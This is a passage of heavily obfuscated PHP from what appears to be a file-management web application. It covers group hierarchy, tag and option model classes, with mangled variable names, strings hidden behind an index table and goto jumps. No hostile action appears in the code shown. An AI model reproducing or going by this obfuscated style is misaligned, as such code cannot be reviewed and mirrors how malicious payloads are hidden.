Model($Ã‰ßê‹[2082])->where($˜æÚ•Õ)->limit($¾ªç«„‘)->select(); if (!$˜ä¦¢²î) { return array(); } $˜ä¦¢²î = array_to_keyvalue($˜ä¦¢²î, $Ã‰ßê‹[12], $Ã‰ßê‹[1979]); $ÕÍŠæ— = $this->where(array($Ã‰ßê‹[2071] => array($Ã‰ßê‹[7], $˜ä¦¢²î)))->select(); if (!$ÕÍŠæ—) { return array(); } return $ÕÍŠæ—; } protected function _listDataApplyItem($¥”¤¿ü‘) { $Ÿ‘ãıËÒ = array($¥”¤¿ü‘); $this->_listDataApply($Ÿ‘ãıËÒ); return $Ÿ‘ãıËÒ[0]; } protected function _listDataApply(&$¥º²àŒ‡) { $ÀêÏäŞÉ =& $_SERVER[Ùæõ‰Ï’]; if (!$¥º²àŒ‡) { return; } $ù«íË‹ = array_to_keyvalue($¥º²àŒ‡, $ÀêÏäŞÉ[12], $ÀêÏäŞÉ[1979]); $this->_listAppendChildren($¥º²àŒ‡); $this->_listAppendChildrenMember($¥º²àŒ‡); $this->_listAppendMeta($¥º²àŒ‡, $ù«íË‹); $this->_listAppendParent($¥º²àŒ‡); $this->_listAppendSourceRoot($¥º²àŒ‡, $ù«íË‹); } private function _listAppendChildren(&$ƒƒŒØ©è) { $¥±åı‚û =& $_SERVER[Ùæõ‰Ï’]; $Ù×°Ğµ² = array_to_keyvalue($ƒƒŒØ©è, $¥±åı‚û[12], $¥±åı‚û[1979]); $¸‡Ñî€” = array($¥±åı‚û[192] => array($¥±åı‚û[7], $Ù×°Ğµ²)); $úÁ„·éÊ = array($¥±åı‚û[192], $¥±åı‚û[2083] => $¥±åı‚û[565]); $ÊŒòæĞß = $this->field($úÁ„·éÊ)->where($¸‡Ñî€”)->group($¥±åı‚û[192])->select(); $Ã¤¯«ËÈ = array_to_keyvalue($ÊŒòæĞß, $¥±åı‚û[192], $¥±åı‚û[565]); foreach ($ƒƒŒØ©è as &$ÅºğÛ¨Ù) { $öÙÈŒ¤÷ = $ÅºğÛ¨Ù[$¥±åı‚û[1979]]; $ÅºğÛ¨Ù[$¥±åı‚û[2084]] = isset($Ã¤¯«ËÈ[$öÙÈŒ¤÷]) ? intval($Ã¤¯«ËÈ[$öÙÈŒ¤÷]) : !1; } unset($ÅºğÛ¨Ù); } private function _listAppendChildrenMember(&$¢ÒÖÇ¥) { $··†¯ù© =& $_SERVER[Ùæõ‰Ï’]; $éÁæî»à = array_to_keyvalue($¢ÒÖÇ¥, $··†¯ù©[12], $··†¯ù©[1979]); $–¬ƒåªî = array($··†¯ù©[1979] => array($··†¯ù©[7], $éÁæî»à)); $×ÎÑï”õ = array($··†¯ù©[1979], $··†¯ù©[2083] => $··†¯ù©[565]); $”ƒ—é«½ = Model($··†¯ù©[2073])->field($×ÎÑï”õ)->where($–¬ƒåªî)->group($··†¯ù©[1979])->select(); $¤›çº¯ = array_to_keyvalue($”ƒ—é«½, $··†¯ù©[1979], $··†¯ù©[565]); foreach ($¢ÒÖÇ¥ as &$¢€Ó´×ü) { $©ñĞ˜Áä = $¢€Ó´×ü[$··†¯ù©[1979]]; $¢€Ó´×ü[$··†¯ù©[2085]] = isset($¤›çº¯[$©ñĞ˜Áä]) ? intval($¤›çº¯[$©ñĞ˜Áä]) : !1; } unset($¢€Ó´×ü); } private function _listAppendMeta(&$÷ùŒÔÛ‹, $å‘¼âÅà) { $Ûáò¼Âğ =& $_SERVER[Ùæõ‰Ï’]; $Ä•Íš– = array($Ûáò¼Âğ[1979] => array($Ûáò¼Âğ[7], $å‘¼âÅà)); $“´»úÈ = Model($Ûáò¼Âğ[2072])->where($Ä•Íš–)->select(); $“´»úÈ = array_to_keyvalue_group($“´»úÈ, $Ûáò¼Âğ[1979]); foreach ($“´»úÈ as &$‘Şºûæ) { $‘Şºûæ = array_to_keyvalue($‘Şºûæ, $Ûáò¼Âğ[97], $Ûáò¼Âğ[450]); } unset($‘Şºûæ); foreach ($÷ùŒÔÛ‹ as &$²Ğé²Ğ°) { $²Ğé²Ğ°[$Ûáò¼Âğ[539]] = array(); if (isset($“´»úÈ[$²Ğé²Ğ°[$Ûáò¼Âğ[1979]]])) { $²Ğé²Ğ°[$Ûáò¼Âğ[539]] = $“´»úÈ[$²Ğé²Ğ°[$Ûáò¼Âğ[1979]]]; } } unset($²Ğé²Ğ°); } protected function parentLevelArray($õ½Ş·•) { $µ”íŠø =& $_SERVER[Ùæõ‰Ï’]; $õ½Ş·• = explode($µ”íŠø[50], trim($õ½Ş·•, $µ”íŠø[50])); $õ½Ş·• = array_remove_value($õ½Ş·•, $µ”íŠø[228]); return $õ½Ş·•; } protected function parentInGroup($ó¢•òÌÎ, $Æ»¥şÀç) { $Ì®«†œå =& $_SERVER[Ùæõ‰Ï’]; $›‚¡Ä×Ç = $this->getInfoSimple($ó¢•òÌÎ); if (!$›‚¡Ä×Ç) { return !0; } $€÷òöç = $this->parentLevelArray($›‚¡Ä×Ç[$Ì®«†œå[584]]); $€÷òöç[] = $ó¢•òÌÎ; foreach ($€÷òöç as $ó¢•òÌÎ) { if (in_array($ó¢•òÌÎ . $Ì®«†œå[12], $Æ»¥şÀç)) { return !0; } } return !1; } private function _listAppendParent(&$Ô†³’«³) { $œ€»„–³ =& $_SERVER[Ùæõ‰Ï’]; $„ßñ¡¸ = array(); foreach ($Ô†³’«³ as &$…±±œº) { $„ßñ¡¸[$…±±œº[$œ€»„–³[1979]]] = $…±±œº[$œ€»„–³[32]]; $§­õ’–° = $this->parentLevelArray($…±±œº[$œ€»„–³[584]]); foreach ($§­õ’–° as $¹”¯»äÏ) { if (!isset($„ßñ¡¸[$¹”¯»äÏ])) { $„ßñ¡¸[$¹”¯»äÏ] = 0; } } } unset($…±±œº); foreach ($„ßñ¡¸ as $“Ãë®ÁÛ => $Š™±ÕÏ) { if ($Š™±ÕÏ) { continue; } $Ğ¹ÓÊ¶¹ = $this->getInfoSimple($“Ãë®ÁÛ); $„ßñ¡¸[$“Ãë®ÁÛ] = $Ğ¹ÓÊ¶¹[$œ€»„–³[32]]; } $æ¨½“Ù = $GLOBALS[$œ€»„–³[6]][$œ€»„–³[92]][$œ€»„–³[2086]]; if (KodUser::isRoot()) { $æ¨½“Ù = !1; } foreach ($Ô†³’«³ as &$…±±œº) { $§­õ’–° = $this->parentLevelArray($…±±œº[$œ€»„–³[584]]); $œ«ïÅÑÅ = $œ€»„–³[12]; foreach ($§­õ’–° as $“Ãë®ÁÛ => $¹”¯»äÏ) { if ($æ¨½“Ù && $“Ãë®ÁÛ == 0) { continue; } $œ«ïÅÑÅ .= $„ßñ¡¸[$¹”¯»äÏ] . $œ€»„–³[8]; } if ($§­õ’–°) { $œ«ïÅÑÅ .= $…±±œº[$œ€»„–³[32]]; } $…±±œº[$œ€»„–³[589]] = str_replace($œ€»„–³[592], $œ€»„–³[8], $œ«ïÅÑÅ); } unset($…±±œº); } private function _listAppendSourceRoot(&$öø¸Ã‡Ú, $Ä›Šèâß) { $ôõŠ¤Á =& $_SERVER[Ùæõ‰Ï’]; $É›ª¾õ = Model($ôõŠ¤Á[907])->listSourceRoot(SourceModel::TYPE_GROUP, $Ä›Šèâß); $É›ª¾õ = array_to_keyvalue($É›ª¾õ, $ôõŠ¤Á[569]); $É›ª¾õ = array_remove_key($É›ª¾õ, $ôõŠ¤Á[569]); foreach ($öø¸Ã‡Ú as &$úÄÖ­Ş¹) { $úÄÖ­Ş¹[$ôõŠ¤Á[90]] = $É›ª¾õ[$úÄÖ­Ş¹[$ôõŠ¤Á[1979]]] ? $É›ª¾õ[$úÄÖ­Ş¹[$ôõŠ¤Á[1979]]] : array(); } unset($úÄÖ­Ş¹); } protected function groupMerge($áó¹ìµ) { $áó¹ìµ = array_values(array_unique($áó¹ìµ)); $ëĞÜ©·ê = array(); for ($ùÁïìˆ« = 0; $ùÁïìˆ« < count($áó¹ìµ); $ùÁïìˆ«++) { $ó’€àìŠ = !1; for ($ÃäÑÇç· = 0; $ÃäÑÇç· < count($áó¹ìµ); $ÃäÑÇç·++) { if ($ùÁïìˆ« == $ÃäÑÇç·) { continue; } if ($this->isParentOf($áó¹ìµ[$ÃäÑÇç·], $áó¹ìµ[$ùÁïìˆ«])) { $ó’€àìŠ = !0; break; } } if (!$ó’€àìŠ) { $ëĞÜ©·ê[] = $áó¹ìµ[$ùÁïìˆ«]; } } return $ëĞÜ©·ê; } protected function isParentOf($ó¤…ğç, $«Ò¯ÔóÉ) { $–‚±õ—™ =& $_SERVER[Ùæõ‰Ï’]; if (!$ó¤…ğç || !$«Ò¯ÔóÉ || $ó¤…ğç == $«Ò¯ÔóÉ) { return !1; } $ë˜œİÆê = $this->getInfoSimple($ó¤…ğç); $¬Õè¼Ğ× = $this->getInfoSimple($«Ò¯ÔóÉ); $º½ôÍ³¿ = $ë˜œİÆê[$–‚±õ—™[584]] . $ó¤…ğç . $–‚±õ—™[50]; if (substr($¬Õè¼Ğ×[$–‚±õ—™[584]], 0, strlen($º½ôÍ³¿)) == $º½ôÍ³¿) { return !0; } return !1; } public function groupShowRoot($ª¤ºÊÛ¬, $‘ä¨Æ™‡ = false) { $…¢Ğ¢ © =& $_SERVER[Ùæõ‰Ï’]; $€ˆÃñê“ = $this->getInfo($ª¤ºÊÛ¬); if (!$€ˆÃñê“) { return array(); } $ğ„ùÙ¤† = $this->parentLevelArray($€ˆÃñê“[$…¢Ğ¢ ©[584]]); $§«ñÁ  = array($ª¤ºÊÛ¬); if (count($ğ„ùÙ¤†) == 0) { return $§«ñÁ ; } if ($‘ä¨Æ™‡ && count($ğ„ùÙ¤†) == 1) { return $§«ñÁ ; } if (!$€ˆÃñê“[$…¢Ğ¢ ©[539]] || !isset($€ˆÃñê“[$…¢Ğ¢ ©[539]][$…¢Ğ¢ ©[2069]]) || $€ˆÃñê“[$…¢Ğ¢ ©[539]][$…¢Ğ¢ ©[2069]] == $…¢Ğ¢ ©[859]) { return $this->groupShowRoot($ğ„ùÙ¤†[count($ğ„ùÙ¤†) - 1], $‘ä¨Æ™‡); } if ($€ˆÃñê“[$…¢Ğ¢ ©[539]][$…¢Ğ¢ ©[2069]] == $…¢Ğ¢ ©[433]) { $¤ÅåÑµ = explode($…¢Ğ¢ ©[50], $€ˆÃñê“[$…¢Ğ¢ ©[539]][$…¢Ğ¢ ©[2070]]); if ($¤ÅåÑµ) { $§«ñÁ  = array_merge($§«ñÁ , $¤ÅåÑµ); } } return $§«ñÁ ; } protected function resetParentLevel() { $¬Òá¬…­ =& $_SERVER[Ùæõ‰Ï’]; $›í€‹ˆ = $¬Òá¬…­[1979]; $Ì¢Ç¨Ä = $this->select(); $Ì¢Ç¨Ä = array_to_keyvalue($Ì¢Ç¨Ä, $›í€‹ˆ); foreach ($Ì¢Ç¨Ä as $ÆõµîÁá) { $øÔó›‚À = $ÆõµîÁá; $àªÜ’ïÍ = array(); while ($øÔó›‚À[$¬Òá¬…­[192]] != 0) { $àªÜ’ïÍ[] = $øÔó›‚À[$¬Òá¬…­[192]]; $øÔó›‚À = $Ì¢Ç¨Ä[$øÔó›‚À[$¬Òá¬…­[192]]]; } $àªÜ’ïÍ[] = 0; $àªÜ’ïÍ = $¬Òá¬…­[50] . implode($¬Òá¬…­[50], array_reverse($àªÜ’ïÍ)) . $¬Òá¬…­[50]; $this->setNamePinyin($ÆõµîÁá[$›í€‹ˆ], $ÆõµîÁá[$¬Òá¬…­[32]]); $this->where(array($›í€‹ˆ => $ÆõµîÁá[$›í€‹ˆ]))->save(array($¬Òá¬…­[652] => $àªÜ’ïÍ)); } return $Ì¢Ç¨Ä; } public function groupNameAuto($é¬¤Ú«İ, $¹Â¡âÙ) { $™Ô€êá =& $_SERVER[Ùæõ‰Ï’]; $…ÃÃœæì = $this->where(array($™Ô€êá[477] => $é¬¤Ú«İ))->getField($™Ô€êá[32], !0); if (!$…ÃÃœæì || !in_array($¹Â¡âÙ, $…ÃÃœæì)) { return $¹Â¡âÙ; } for ($õÓÛ±«ä = 1; $õÓÛ±«ä <= count($…ÃÃœæì) + 1; $õÓÛ±«ä++) { $ËãáÆ–ì = $¹Â¡âÙ . "\x28{$õÓÛ±«ä}\51"; if (!in_array($ËãáÆ–ì, $…ÃÃœæì)) { return $ËãáÆ–ì; } } } public function groupSwitch($ï¾¬ ×ç, $ò”Ÿˆ‡) { $ÇËå·¾î =& $_SERVER[Ùæõ‰Ï’]; $ò°ù«“¥ = array($ÇËå·¾î[1979] => array($ÇËå·¾î[7], array($ï¾¬ ×ç, $ò”Ÿˆ‡))); $öğ»íé• = $this->where($ò°ù«“¥)->select(); $öğ»íé• = array_to_keyvalue($öğ»íé•, $ÇËå·¾î[1979]); if (!isset($öğ»íé•[$ï¾¬ ×ç]) || !isset($öğ»íé•[$ò”Ÿˆ‡]) || $öğ»íé•[$ï¾¬ ×ç][$ÇËå·¾î[192]] == 0) { return !1; } $ò°ù«“¥ = array($ÇËå·¾î[1979] => $ï¾¬ ×ç); $¿ë§³ƒ÷ = Model($ÇËå·¾î[2073])->where($ò°ù«“¥)->select(); if (!$¿ë§³ƒ÷) { $¿ë§³ƒ÷ = array(); } foreach ($¿ë§³ƒ÷ as $´ŒÏÃ²) { $Š…Şõ¡ = $´ŒÏÃ²[$ÇËå·¾î[1781]]; $ò°ù«“¥ = array($ÇËå·¾î[1781] => $Š…Şõ¡, $ÇËå·¾î[1979] => $ò”Ÿˆ‡); $×òÈÑÄı = Model($ÇËå·¾î[2073])->where($ò°ù«“¥)->find(); if (!$×òÈÑÄı) { $ë–äü² = array($ò”Ÿˆ‡ => $´ŒÏÃ²[$ÇËå·¾î[2087]]); Model($ÇËå·¾î[598])->userGroupAdd($Š…Şõ¡, $ë–äü²); } Model($ÇËå·¾î[598])->userGroupRemove($Š…Şõ¡, $ï¾¬ ×ç); } $ò°ù«“¥ = array($ÇËå·¾î[190] => 2, $ÇËå·¾î[192] => 0, $ÇËå·¾î[485] => 1, $ÇËå·¾î[569] => array($ÇËå·¾î[7], array($ï¾¬ ×ç, $ò”Ÿˆ‡))); $ºıÏÍ¤û = Model($ÇËå·¾î[907])->where($ò°ù«“¥)->field($ÇËå·¾î[2088])->select(); $ºıÏÍ¤û = array_to_keyvalue($ºıÏÍ¤û, $ÇËå·¾î[569], $ÇËå·¾î[193]); $û¢³Ô¹  = !empty($ºıÏÍ¤û[$ï¾¬ ×ç]) ? $ºıÏÍ¤û[$ï¾¬ ×ç] : !1; if ($û¢³Ô¹ ) { if (!$ºıÏÍ¤û[$ò”Ÿˆ‡]) { $ºıÏÍ¤û[$ò”Ÿˆ‡] = Model($ÇËå·¾î[907])->groupRootAdd($ò”Ÿˆ‡); } $êŠò®¢« = $ºıÏÍ¤û[$ò”Ÿˆ‡]; $ò°ù«“¥ = array($ÇËå·¾î[192] => $û¢³Ô¹ ); $ºıÏÍ¤û = Model($ÇËå·¾î[907])->where($ò°ù«“¥)->field($ÇËå·¾î[2089])->select(); if (!$ºıÏÍ¤û) { $ºıÏÍ¤û = array(); } Model($ÇËå·¾î[907])->moveClearAuth = !1; foreach ($ºıÏÍ¤û as $ëÍˆƒæ×) { $‹ÈŠ¦ = $ëÍˆƒæ×[$ÇËå·¾î[485]] == $ÇËå·¾î[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÇËå·¾î[907])->move($ëÍˆƒæ×[$ÇËå·¾î[193]], $êŠò®¢«, $‹ÈŠ¦); } Model($ÇËå·¾î[907])->moveClearAuth = !0; $ò°ù«“¥ = array($ÇËå·¾î[190] => 2, $ÇËå·¾î[569] => $ï¾¬ ×ç); $â‘º»¸œ = array($ÇËå·¾î[569] => $ò”Ÿˆ‡); Model($ÇËå·¾î[2090])->where($ò°ù«“¥)->save($â‘º»¸œ); Model($ÇËå·¾î[2091])->where($ò°ù«“¥)->save($â‘º»¸œ); } $this->_changeChildLevel($öğ»íé•[$ï¾¬ ×ç], $öğ»íé•[$ò”Ÿˆ‡], !0); $this->where(array($ÇËå·¾î[192] => $ï¾¬ ×ç))->save(array($ÇËå·¾î[192] => $ò”Ÿˆ‡)); $this->_clearChildrenCache($öğ»íé•[$ò”Ÿˆ‡]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($ÏâŒ„š) { $á÷æÎüñ =& $_SERVER[Ùæõ‰Ï’]; return array($á÷æÎüñ[2092] => array($ÏâŒ„š[0], $á÷æÎüñ[2093]), $á÷æÎüñ[2094] => array($ÏâŒ„š[0], $á÷æÎüñ[2095])); } protected function get($¡åˆ«ôì) { $ô¦ÏÍ  =& $_SERVER[Ùæõ‰Ï’]; $éë½şŠ = Model($ô¦ÏÍ [585])->metaGet($¡åˆ«ôì, $ô¦ÏÍ [2096]); $‚¶ƒæİ§ = json_decode($éë½şŠ, !0); return $‚¶ƒæİ§ ? $‚¶ƒæİ§ : array($ô¦ÏÍ [2097] => $ô¦ÏÍ [91], $ô¦ÏÍ [445] => array()); } protected function set($‹Ö”û´, $®–ÜŒñ¼) { $ù—¾†ãˆ =& $_SERVER[Ùæõ‰Ï’]; $®–ÜŒñ¼ = $®–ÜŒñ¼ ? $®–ÜŒñ¼ : array($ù—¾†ãˆ[2097] => $ù—¾†ãˆ[91], $ù—¾†ãˆ[445] => array()); return Model($ù—¾†ãˆ[585])->metaSet($‹Ö”û´, $ù—¾†ãˆ[2096], json_encode($®–ÜŒñ¼)); } protected function getByTagID($æ¶±ÜŒá, $¢…ÖÈˆ„) { $ç¡ äïĞ =& $_SERVER[Ùæõ‰Ï’]; if (!$æ¶±ÜŒá || !$¢…ÖÈˆ„) { return !1; } if (!Model($ç¡ äïĞ[585])->getInfoSimple($æ¶±ÜŒá)) { return !1; } $à„½ïÛš = $this->get($æ¶±ÜŒá); if (!$à„½ïÛš || !isset($à„½ïÛš[$ç¡ äïĞ[445]])) { return !1; } $€„üÍˆ = array_find_by_field($à„½ïÛš[$ç¡ äïĞ[445]], $ç¡ äïĞ[475], $¢…ÖÈˆ„); return is_array($€„üÍˆ) ? $€„üÍˆ : !1; } public function listSource($ŸÏû¬ÁÃ, $¨Ê›‘¨­) { $¯’íµÕË =& $_SERVER[Ùæõ‰Ï’]; if ($¨Ê›‘¨­ && !is_array($¨Ê›‘¨­)) { $¨Ê›‘¨­ = array($¨Ê›‘¨­); } $ ÍŞå¾û = $this->listData($ŸÏû¬ÁÃ); $îó×Ğ™ƒ = array(); foreach ($ ÍŞå¾û as $£êŸ€ ø) { $ë¬œº½ù = $£êŸ€ ø[$¯’íµÕË[87]]; if (!$ë¬œº½ù) { continue; } if (!isset($îó×Ğ™ƒ[$ë¬œº½ù])) { $îó×Ğ™ƒ[$ë¬œº½ù] = array(); } $îó×Ğ™ƒ[$ë¬œº½ù][] = $£êŸ€ ø[$¯’íµÕË[500]]; } $êˆ¡˜å = array(); foreach ($îó×Ğ™ƒ as $°ñÒ¡®ë => $‡ØÍşãù) { $™œ¾›‚ = !0; if (!$¨Ê›‘¨­) { $êˆ¡˜å[] = $°ñÒ¡®ë; continue; } foreach ($¨Ê›‘¨­ as $åÀ¼…¸) { if (!in_array($åÀ¼…¸, $‡ØÍşãù)) { $™œ¾›‚ = !1; break; } } if ($™œ¾›‚) { $êˆ¡˜å[] = $°ñÒ¡®ë; } } if (!$êˆ¡˜å) { return array(); } $ĞîæˆÍ› = array($¯’íµÕË[491] => array($¯’íµÕË[492], $êˆ¡˜å), $¯’íµÕË[569] => $ŸÏû¬ÁÃ, $¯’íµÕË[190] => SourceModel::TYPE_GROUP); $ú¹‰¹ì• = Model($¯’íµÕË[1430])->listSource($ĞîæˆÍ›); if (!$ú¹‰¹ì• || count($êˆ¡˜å) == $ú¹‰¹ì•[$¯’íµÕË[442]][$¯’íµÕË[443]]) { return $ú¹‰¹ì•; } $ê÷¾Ì = array(); $™Â€šøõ = array_to_keyvalue($ú¹‰¹ì•[$¯’íµÕË[85]], $¯’íµÕË[12], $¯’íµÕË[193]); $ãƒøâ­ = array_to_keyvalue($ú¹‰¹ì•[$¯’íµÕË[86]], $¯’íµÕË[12], $¯’íµÕË[193]); $ãºòÏÒÜ = array_merge($ãƒøâ­, $™Â€šøõ); foreach ($êˆ¡˜å as $ë¬œº½ù) { if (!in_array($ë¬œº½ù, $ãºòÏÒÜ)) { $ê÷¾Ì[] = $ë¬œº½ù; } } if ($ê÷¾Ì) { $this->removeBySource($ŸÏû¬ÁÃ, $ê÷¾Ì); } return $ú¹‰¹ì•; } protected function listData($ö¹ÇÆÓş) { $‹Àµ”ŞÓ =& $_SERVER[Ùæõ‰Ï’]; $‚ÆÑ¢‘ = array($‹Àµ”ŞÓ[1772] => 0, $‹Àµ”ŞÓ[557] => array($‹Àµ”ŞÓ[2098], 0), $‹Àµ”ŞÓ[496] => $‹Àµ”ŞÓ[2099] . $ö¹ÇÆÓş); $Îô¾Ê“ğ = $‹Àµ”ŞÓ[2100]; $ãÕá¯§ = $this->field($Îô¾Ê“ğ)->where($‚ÆÑ¢‘)->order($‹Àµ”ŞÓ[2101])->select(); return $ãÕá¯§ ? $ãÕá¯§ : array(); } protected function addToTag($…ÌĞ¢è, $›·Îé¨›, $Ù‘ô‚´—) { $øÏ±Ô÷ğ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->getByTagID($…ÌĞ¢è, $Ù‘ô‚´—) || !$›·Îé¨›) { return !1; } if (!Model($øÏ±Ô÷ğ[907])->pathInfo($›·Îé¨›)) { return !1; } $ŒâÁ¨½¼ = array($øÏ±Ô÷ğ[1772] => 0, $øÏ±Ô÷ğ[557] => $Ù‘ô‚´—, $øÏ±Ô÷ğ[495] => $›·Îé¨›, $øÏ±Ô÷ğ[496] => $øÏ±Ô÷ğ[2102] . $…ÌĞ¢è, $øÏ±Ô÷ğ[494] => $øÏ±Ô÷ğ[12], $øÏ±Ô÷ğ[1983] => 0); if ($this->where($ŒâÁ¨½¼)->find()) { return !1; } return $this->add($ŒâÁ¨½¼); } protected function removeFromTag($Ô‡ šÑÌ, $â•±æÏ, $öæÕ) { $µˆ¥¬œ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->getByTagID($Ô‡ šÑÌ, $öæÕ) || !$â•±æÏ) { return !1; } if (is_array($â•±æÏ)) { $â•±æÏ = array($µˆ¥¬œ[7], $â•±æÏ); } $è»‘˜¬É = array($µˆ¥¬œ[1772] => 0, $µˆ¥¬œ[557] => $öæÕ, $µˆ¥¬œ[496] => $µˆ¥¬œ[2102] . $Ô‡ šÑÌ, $µˆ¥¬œ[495] => $â•±æÏ); return $this->where($è»‘˜¬É)->delete(); } protected function removeByTag($ù®–šÒ, $Ú®½ï¥«) { $™¯Û½æø =& $_SERVER[Ùæõ‰Ï’]; if (!$this->getByTagID($ù®–šÒ, $Ú®½ï¥«)) { return !1; } $°åÄ‡ë = array($™¯Û½æø[1772] => 0, $™¯Û½æø[557] => $Ú®½ï¥«, $™¯Û½æø[496] => $™¯Û½æø[2102] . $ù®–šÒ); return $this->where($°åÄ‡ë)->delete(); } protected function removeBySource($Øãç…·Ç, $ª¸ËÏˆ) { $•½Æ²™ =& $_SERVER[Ùæõ‰Ï’]; if (!$Øãç…·Ç || !$ª¸ËÏˆ) { return !1; } if (is_array($ª¸ËÏˆ)) { $ª¸ËÏˆ = array($•½Æ²™[7], $ª¸ËÏˆ); } $±¶åÅ«¶ = array($•½Æ²™[1772] => 0, $•½Æ²™[495] => $ª¸ËÏˆ, $•½Æ²™[557] => array($•½Æ²™[1105], 0), $•½Æ²™[496] => $•½Æ²™[2102] . $Øãç…·Ç); return $this->where($±¶åÅ«¶)->delete(); } } goto e½ÆÙ³Ğ÷‘; AÒ½Î‰è ¥: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\x65\x6d\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($ÅŒğÎ÷ = false, $¸™¸òƒ¨ = "\x6d\157\144\x69\146\171\124\151\x6d\x65", $Š á²Ğù = false) { $‘‰ÇÈ = Model($this->modelType)->get(!1, $this->optionType, !0); $€ğ¥®ÚÍ = array_values($‘‰ÇÈ); if ($€ğ¥®ÚÍ && $€ğ¥®ÚÍ[0] && !is_array($€ğ¥®ÚÍ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‘‰ÇÈ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‘‰ÇÈ) { return $ÅŒğÎ÷ ? null : array(); } if (!$ÅŒğÎ÷) { $‘‰ÇÈ = array_filter(array_values($‘‰ÇÈ)); return array_sort_by($‘‰ÇÈ, $¸™¸òƒ¨, $Š á²Ğù); } return $‘‰ÇÈ[$_SERVER[Ùæõ‰Ï’][472] . $ÅŒğÎ÷]; } public function insert($ú£Ğà î) { $Ê¸Š½ÊÚ =& $_SERVER[Ùæõ‰Ï’]; $ú£Ğà î = array_field_key($ú£Ğà î, $this->field); $•ØÏÒÛ¹ = Model($this->modelType)->get($Ê¸Š½ÊÚ[473], $this->optionType . $Ê¸Š½ÊÚ[474]); $•ØÏÒÛ¹ = $•ØÏÒÛ¹ ? $•ØÏÒÛ¹ : 0; $ú£Ğà î[$Ê¸Š½ÊÚ[475]] = ++$•ØÏÒÛ¹; $ú£Ğà î[$Ê¸Š½ÊÚ[231]] = time(); $ú£Ğà î[$Ê¸Š½ÊÚ[88]] = time(); Model($this->modelType)->set($Ê¸Š½ÊÚ[473], $•ØÏÒÛ¹, $this->optionType . $Ê¸Š½ÊÚ[474]); Model($this->modelType)->set($Ê¸Š½ÊÚ[472] . $•ØÏÒÛ¹, $ú£Ğà î, $this->optionType); return $•ØÏÒÛ¹; } public function update($¢Ì’¾¼é, $ü½·ëßÑ) { $Îí³¹­ =& $_SERVER[Ùæõ‰Ï’]; $ü½·ëßÑ = array_field_key($ü½·ëßÑ, $this->field); $ÀÖ’›‹– = $this->listData($¢Ì’¾¼é); if (!$ÀÖ’›‹– || !$¢Ì’¾¼é) { return !1; } $ü½·ëßÑ = array_merge($ÀÖ’›‹–, $ü½·ëßÑ); $ü½·ëßÑ[$Îí³¹­[88]] = time(); return Model($this->modelType)->set($Îí³¹­[472] . $¢Ì’¾¼é, $ü½·ëßÑ, $this->optionType); } public function remove($Ş×€Àãæ) { if (!$Ş×€Àãæ) { return !1; } return Model($this->modelType)->remove($_SERVER[Ùæõ‰Ï’][472] . $Ş×€Àãæ, $this->optionType); } public function clear() { $ŞíœĞŒ¥ =& $_SERVER[Ùæõ‰Ï’]; Model($this->modelType)->remove($ŞíœĞŒ¥[473], $this->optionType . $ŞíœĞŒ¥[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¡Ğ˜ŸÕ±, $¼ÔäÂÑó) { if (!$¼ÔäÂÑó) { return !1; } $»’ƒŸ† = $this->listData(); $»’ƒŸ† = array_to_keyvalue($»’ƒŸ†, $¡Ğ˜ŸÕ±); return isset($»’ƒŸ†[$¼ÔäÂÑó]) ? $»’ƒŸ†[$¼ÔäÂÑó] : !1; } public function findByName($­«ªşë») { return $this->findByKey($_SERVER[Ùæõ‰Ï’][32], $­«ªşë»); } protected function resetData($¹ßù÷ñÄ) { $£‚¦µğ· =& $_SERVER[Ùæõ‰Ï’]; $¹ßù÷ñÄ = is_array($¹ßù÷ñÄ) ? $¹ßù÷ñÄ : array(); $¦ùÌîõ = array(); for ($¢±¡ª‘ = 0; $¢±¡ª‘ < count($¹ßù÷ñÄ); $¢±¡ª‘++) { $¦ùÌîõ[$£‚¦µğ·[472] . $¹ßù÷ñÄ[$¢±¡ª‘][$£‚¦µğ·[475]]] = $¹ßù÷ñÄ[$¢±¡ª‘]; } return Model($this->modelType)->set($¦ùÌîõ, !1, $this->optionType); } private function getAutoName($é“†¼ì…) { $®ïËÓëÆ = array_to_keyvalue($this->listData(), $_SERVER[Ùæõ‰Ï’][32]); if (!$®ïËÓëÆ || !isset($®ïËÓëÆ[$é“†¼ì…])) { return $é“†¼ì…; } for ($¸“Ê—úÛ = 1; $¸“Ê—úÛ < count($®ïËÓëÆ); $¸“Ê—úÛ++) { $Åõ¢è½ô = $é“†¼ì… . "\50{$¸“Ê—úÛ}\51"; if (!isset($®ïËÓëÆ[$Åõ¢è½ô])) { return $Åõ¢è½ô; } } return $Åõ¢è½ô; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ Õ®‡¢ = false, $•¾ú˜Ğ¯ = '', $Õñ‡ŒûÂ = false) { $ü Æšƒ =& $_SERVER[Ùæõ‰Ï’]; $³òñÀ…½ = $this->cacheGet($•¾ú˜Ğ¯); $Û¥Û•¹Ò = $this->optionDefault($•¾ú˜Ğ¯); $Û¥Û•¹Ò = is_array($Û¥Û•¹Ò) ? $Û¥Û•¹Ò : array(); if (is_array($³òñÀ…½)) { $³òñÀ…½ = array_merge($Û¥Û•¹Ò, $³òñÀ…½); return $ Õ®‡¢ ? isset($³òñÀ…½[$ Õ®‡¢]) ? $³òñÀ…½[$ Õ®‡¢] : null : $³òñÀ…½; } $ï×„Æƒå = $this->filterWhere(array($ü Æšƒ[33] => $•¾ú˜Ğ¯)); $³òñÀ…½ = $this->where($ï×„Æƒå)->select(); $³òñÀ…½ = array_to_keyvalue($³òñÀ…½, $ü Æšƒ[97], $ü Æšƒ[450]); foreach ($³òñÀ…½ as $€ÁÄÀİÜ => $Ğ‡ÑÅÂÁ) { if ($Õñ‡ŒûÂ || in_array($€ÁÄÀİÜ, $this->jsonField)) { $³òñÀ…½[$€ÁÄÀİÜ] = json_decode($Ğ‡ÑÅÂÁ, !0); } } $this->cacheSet($•¾ú˜Ğ¯, $³òñÀ…½); $³òñÀ…½ = 